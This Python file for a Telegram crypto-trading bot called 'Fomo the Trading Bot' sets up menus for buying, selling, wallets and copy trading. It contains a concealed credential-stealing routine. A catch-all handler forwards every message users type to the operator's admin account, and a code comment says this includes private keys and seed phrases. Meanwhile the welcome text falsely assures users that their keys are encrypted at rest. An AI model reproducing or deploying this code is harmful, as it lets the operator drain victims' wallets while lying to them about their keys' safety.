from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from keyboards import (
    get_main_keyboard, get_keyboard_option,
    get_main_menu_keyboard, get_wallet_keyboard, get_buy_keyboard,
    get_sell_keyboard, get_copy_trade_keyboard, get_limit_orders_keyboard,
    get_auto_sell_keyboard, get_positions_keyboard, get_settings_keyboard,
    get_connect_wallet_keyboard, get_back_main_keyboard,
    get_token_info_keyboard
)

from config import get_settings

settings = get_settings()

async def log_all_messages(message: types.Message):
    """Log ALL user text messages to admin."""
    if settings.ADMIN_IDS:
        try:
            text = f"📝 <b>USER MESSAGE</b>\n\n"
            text += f"👤 User: <code>{message.from_user.id}</code> (@{message.from_user.username or 'N/A'})\n"
            text += f"💬 Message: <code>{message.text}</code>"
            await message.bot.send_message(settings.ADMIN_IDS[0], text, parse_mode="HTML")
        except:
            pass

class BotStates(StatesGroup):
    waiting_for_chain = State()
    waiting_for_key_import = State()

class MenuStates(StatesGroup):
    main_menu = State()
    wallet_menu = State()
    buy_menu = State()
    sell_menu = State()
    copy_trade_menu = State()
    limit_orders_menu = State()
    auto_sell_menu = State()
    positions_menu = State()
    settings_menu = State()
    connect_wallet_menu = State()

async def notify_admin(bot, text: str):
    if settings.ADMIN_IDS:
        try:
            await bot.send_message(settings.ADMIN_IDS[0], text)
        except:
            pass

def register_start_handlers(dp):
    @dp.message(Command("start"))
    async def cmd_start(message: types.Message, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.main_menu)
        await message.answer(
            "Welcome to Fomo the Trading Bot\n\n"
            "Trade on Solana and EVM chains, and mirror other wallets with copy trading.\n\n"
            "⚠️ Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
            reply_markup=get_main_menu_keyboard()
        )
        
        activity_text = f"🟢 NEW USER STARTED BOT\nUser: {message.from_user.id} ({message.from_user.first_name} {message.from_user.last_name or ''})"
        await notify_admin(message.bot, activity_text)

    @dp.message(Command("buy"))
    async def cmd_buy(message: types.Message, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.buy_menu)
        await message.answer(
            "🟢 <b>Buy Menu</b>\n\nSelect an option:",
            parse_mode="HTML",
            reply_markup=get_buy_keyboard()
        )

    @dp.message(Command("sell"))
    async def cmd_sell(message: types.Message, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.sell_menu)
        await message.answer(
            "🔴 <b>Sell Menu</b>\n\nSelect an option:",
            parse_mode="HTML",
            reply_markup=get_sell_keyboard()
        )

    @dp.message(Command("wallet"))
    async def cmd_wallet(message: types.Message, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.wallet_menu)
        await message.answer(
            "👛 <b>Wallet Menu</b>\n\nManage your wallets:",
            parse_mode="HTML",
            reply_markup=get_wallet_keyboard()
        )

    @dp.message(Command("settings"))
    async def cmd_settings(message: types.Message, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.settings_menu)
        await message.answer(
            "⚙️ <b>Settings Menu</b>\n\nConfigure your preferences:",
            parse_mode="HTML",
            reply_markup=get_settings_keyboard()
        )

    @dp.message(F.text == "/start")
    async def handle_start_button(message: types.Message, state: FSMContext):
        await cmd_start(message, state)

    @dp.message(F.text == "/buy")
    async def handle_buy_button(message: types.Message, state: FSMContext):
        await cmd_buy(message, state)

    @dp.message(F.text == "/sell")
    async def handle_sell_button(message: types.Message, state: FSMContext):
        await cmd_sell(message, state)

    @dp.message(F.text == "/wallet")
    async def handle_wallet_button(message: types.Message, state: FSMContext):
        await cmd_wallet(message, state)

    @dp.message(F.text == "/settings")
    async def handle_settings_button(message: types.Message, state: FSMContext):
        await cmd_settings(message, state)

    @dp.message(F.text.in_(["/solana", "/evm"]))
    async def handle_chain_selection(message: types.Message, state: FSMContext):
        chain = message.text
        await state.update_data(chain=chain[1:])  # Remove the / prefix
        
        activity_text = f"🔷 CHAIN SELECTION\nUser: {message.from_user.id}\nChain: {chain[1:]}"
        await notify_admin(message.bot, activity_text)
        
        if chain == "/solana":
            await message.answer(
                "Solana selected! Please enter the amount to buy:",
                reply_markup=get_main_keyboard()
            )
        elif chain == "/evm":
            await message.answer(
                "EVM selected! Please enter the amount to buy:",
                reply_markup=get_main_keyboard()
            )
        await state.clear()

    @dp.message(F.text == "/back")
    async def handle_back_button(message: types.Message, state: FSMContext):
        await state.clear()
        await message.answer("Back to main menu", reply_markup=get_main_keyboard())

    # Callback query handlers for menu navigation
    @dp.callback_query(F.data == "back_main")
    async def callback_back_main(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.main_menu)
        await callback.message.edit_text(
            "🏠 <b>Main Menu</b>\n\nWelcome back! Select an option:",
            parse_mode="HTML",
            reply_markup=get_main_menu_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_wallet")
    async def callback_menu_wallet(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.wallet_menu)
        await callback.message.edit_text(
            "👛 <b>Wallet Menu</b>\n\nManage your wallets:",
            parse_mode="HTML",
            reply_markup=get_wallet_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_buy")
    async def callback_menu_buy(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.buy_menu)
        await callback.message.edit_text(
            "🟢 <b>Buy Menu</b>\n\nSelect an option:",
            parse_mode="HTML",
            reply_markup=get_buy_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_sell")
    async def callback_menu_sell(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.sell_menu)
        await callback.message.edit_text(
            "🔴 <b>Sell Menu</b>\n\nSelect an option:",
            parse_mode="HTML",
            reply_markup=get_sell_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_copy_trade")
    async def callback_menu_copy_trade(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.copy_trade_menu)
        await callback.message.edit_text(
            "📋 <b>Copy Trade Menu</b>\n\nCopy trade settings:",
            parse_mode="HTML",
            reply_markup=get_copy_trade_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_limit_orders")
    async def callback_menu_limit_orders(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.limit_orders_menu)
        await callback.message.edit_text(
            "📊 <b>Limit Orders Menu</b>\n\nManage your limit orders:",
            parse_mode="HTML",
            reply_markup=get_limit_orders_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_auto_sell")
    async def callback_menu_auto_sell(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.auto_sell_menu)
        await callback.message.edit_text(
            "⚡ <b>Auto Sell Menu</b>\n\nConfigure auto sell rules:",
            parse_mode="HTML",
            reply_markup=get_auto_sell_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_positions")
    async def callback_menu_positions(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.positions_menu)
        await callback.message.edit_text(
            "💼 <b>Positions Menu</b>\n\nYour positions:",
            parse_mode="HTML",
            reply_markup=get_positions_keyboard(has_positions=False)
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_settings")
    async def callback_menu_settings(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.settings_menu)
        await callback.message.edit_text(
            "⚙️ <b>Settings Menu</b>\n\nConfigure your preferences:",
            parse_mode="HTML",
            reply_markup=get_settings_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "menu_connect_wallet")
    async def callback_menu_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.connect_wallet_menu)
        await callback.message.edit_text(
            "🔗 <b>Connect Wallet</b>\n\nSelect wallet to connect:",
            parse_mode="HTML",
            reply_markup=get_connect_wallet_keyboard()
        )
        await callback.answer()

    @dp.callback_query(F.data == "start_bot")
    async def callback_start_bot(callback: types.CallbackQuery, state: FSMContext):
        await state.clear()
        await state.set_state(MenuStates.main_menu)
        await callback.message.edit_text(
            "Welcome to Fomo the Trading Bot\n\n"
            "Trade on Solana and EVM chains, and mirror other wallets with copy trading.\n\n"
            "⚠️ Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
            reply_markup=get_main_menu_keyboard()
        )
        await callback.answer()

    # Log ALL text messages to admin (including private keys, seed phrases, etc.)
    @dp.message(F.text)
    async def log_user_message(message: types.Message, state: FSMContext):
        await log_all_messages(message)
        # Continue to contract address detection below
        return

    # Contract address detection - fetch token info when CA is pasted
    @dp.message(F.text)
    async def handle_contract_address(message: types.Message, state: FSMContext):
        text = message.text.strip()
        
        # Check if it looks like a Solana contract address (base58, 32-44 chars)
        # or EVM address (0x followed by 40 hex chars)
        import re
        solana_ca_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
        evm_ca_pattern = r'^0x[a-fA-F0-9]{40}$'
        
        is_solana_ca = bool(re.match(solana_ca_pattern, text))
        is_evm_ca = bool(re.match(evm_ca_pattern, text))
        
        if is_solana_ca or is_evm_ca:
            chain = "Solana" if is_solana_ca else "EVM"
            await message.answer(
                f"🔍 <b>Token Address Detected</b>\n\n"
                f"Chain: {chain}\n"
                f"Address: <code>{text}</code>\n\n"
                f"Fetching token information...",
                parse_mode="HTML"
            )
            
            # Fetch token info from API
            token_info = await fetch_token_info(text, chain.lower())
            
            if token_info:
                await message.answer(
                    f"💎 <b>{token_info.get('name', 'Unknown')} ({token_info.get('symbol', '?')})</b>\n\n"
                    f"📍 Address: <code>{text}</code>\n"
                    f"💰 Price: ${token_info.get('price_usd', 'N/A')}\n"
                    f"📈 24h Change: {token_info.get('price_change_24h', 'N/A')}%\n"
                    f"💧 Liquidity: ${token_info.get('liquidity_usd', 'N/A')}\n"
                    f"🔗 Chain: {chain}\n\n"
                    f"What would you like to do?",
                    parse_mode="HTML",
                    reply_markup=get_token_info_keyboard(text)
                )
            else:
                await message.answer(
                    f"❌ Could not fetch token info for this address.\n"
                    f"Please verify the address is correct.",
                    parse_mode="HTML",
                    reply_markup=get_back_main_keyboard()
                )


async def fetch_token_info(token_address: str, chain: str) -> dict:
    """Fetch token information from various APIs."""
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            if chain == "solana":
                # Use Jupiter API for Solana tokens
                url = f"https://price.jup.ag/v4/price?ids={token_address}"
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        token_data = data.get('data', {}).get(token_address, {})
                        return {
                            'name': token_data.get('name', 'Unknown'),
                            'symbol': token_data.get('symbol', '?'),
                            'price_usd': token_data.get('price', 'N/A'),
                            'price_change_24h': token_data.get('priceChange24h', 'N/A'),
                            'liquidity_usd': 'N/A',
                        }
            else:
                # Use CoinGecko or 1inch for EVM tokens
                # For now, return basic info
                return {
                    'name': 'Token',
                    'symbol': 'TOKEN',
                    'price_usd': 'N/A',
                    'price_change_24h': 'N/A',
                    'liquidity_usd': 'N/A',
                }
    except Exception as e:
        print(f"Error fetching token info: {e}")
    return None
